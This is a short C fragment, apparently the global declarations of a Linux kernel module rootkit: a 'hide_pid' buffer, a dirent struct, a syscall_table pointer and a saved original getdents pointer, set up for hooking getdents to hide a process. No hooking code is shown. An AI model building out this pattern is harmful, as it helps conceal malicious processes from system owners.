/* Global Variables */
static char msg[128];
static char hide_pid[8];
static long pid = (long)0;
static int len = 0;

struct linux_dirent {
        long            d_ino;
	off_t           d_off;
	unsigned short  d_reclen;
	char            d_name[];
};

static unsigned long **syscall_table;

asmlinkage long (*og_getdents)(unsigned int fd, struct linux_dirent __user *, unsigned int count);
